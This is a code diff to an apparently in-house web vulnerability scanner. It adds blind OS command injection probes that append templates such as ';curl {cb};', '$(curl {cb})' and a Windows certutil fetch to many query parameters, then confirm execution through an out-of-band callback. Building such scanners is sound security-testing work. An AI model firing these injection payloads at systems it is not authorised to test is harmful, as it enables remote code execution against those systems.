@@ -44,6 +44,27 @@ _XXE_PAYLOAD = (
     '<heaven><probe>&{name};</probe></heaven>'
 )
 
+# Parameters that commonly reach a shell (blind OS command injection sinks).
+_CMDI_PARAMS = (
+    "cmd", "exec", "command", "run", "ping", "host", "ip", "addr", "domain",
+    "query", "search", "name", "file", "path", "target", "url", "dns", "lookup",
+    "action", "func", "op", "data", "input", "arg", "args",
+)
+
+# Blind command-injection payloads. Each asks the target's shell to fetch the
+# collaborator URL ({cb}); a callback proves OS command execution. ``{cb}`` is a
+# plain http URL, so curl/wget/certutil all reach the in-house HTTP listener.
+_CMDI_TEMPLATES = (
+    ";curl {cb};",
+    ";wget -q -O- {cb};",
+    "|curl {cb}",
+    "&&curl {cb}",
+    "$(curl {cb})",
+    "`curl {cb}`",
+    "&curl {cb}",                              # Windows cmd chaining
+    "&certutil -urlcache -f {cb} h.tmp",       # Windows LOLBin fetch
+)
+
 _DEFAULT_TIMEOUT = 8.0
 _CALLBACK_WAIT = 3.0
 
@@ -148,9 +169,45 @@ async def _probe_xxe(session: "aiohttp.ClientSession", url: str,
     return []
 
 
+async def _probe_cmdi(session: "aiohttp.ClientSession", url: str,
+                      oast: OASTListener) -> list[dict]:
+    """Blind OS command injection via out-of-band callback. Injects a shell
+    command that fetches the collaborator into each candidate parameter; a
+    callback proves code execution (definitionally zero false positive)."""
+    parsed = urlparse(url)
+    existing = parse_qsl(parsed.query, keep_blank_values=True)
+    params = {k for k, _ in existing} | set(_CMDI_PARAMS)
+    token_map: dict[str, str] = {}
+    coros = []
+    for param in params:
+        token = oast.new_token()
+        token_map[token] = param
+        cb = oast.url_for(token)
+        base_val = dict(existing).get(param, "1")
+        for tpl in _CMDI_TEMPLATES:
+            qs = [(k, v) for k, v in existing if k != param]
+            qs.append((param, base_val + tpl.format(cb=cb)))
+            probe = urlunparse(parsed._replace(query=urlencode(qs)))
+            coros.append(_fire(session, "GET", probe))
+    await asyncio.gather(*coros, return_exceptions=True)
+    await _wait_for_callbacks(oast, list(token_map), _CALLBACK_WAIT)
+
+    findings: list[dict] = []
+    for token, param in token_map.items():
+        if oast.hit(token):
+            findings.append(_finding(
+                url, "command_injection", "critical",
+                f"Blind OS command injection via '{param}'",
+                "The server executed an injected shell command — proven by an "
+                "out-of-band callback from the target to HEAVEN's collaborator. "
+                "This is remote code execution.",
+                0.95, {**_evidence_for(oast, token), "parameter": param}))
+    return findings
+
+
 async def scan_oob(urls: list[str], oast: OASTListener | None = None,
                    timeout: float = _DEFAULT_TIMEOUT, max_urls: int = 25,
-                   xxe: bool = True) -> dict:
+                   xxe: bool = True, cmdi: bool = True) -> dict:
     """Probe URLs for SSRF and XXE using an out-of-band collaborator.
 
     Pass an already-running :class:`OASTListener` (the orchestrator shares one);
@@ -190,6 +247,8 @@ async def scan_oob(urls: list[str], oast: OASTListener | None = None,
                     findings.extend(await _probe_ssrf(session, u, oast))
                     if xxe:
                         findings.extend(await _probe_xxe(session, u, oast))
+                    if cmdi:
+                        findings.extend(await _probe_cmdi(session, u, oast))
 
             await asyncio.gather(*[_one(u) for u in unique], return_exceptions=True)
     finally:
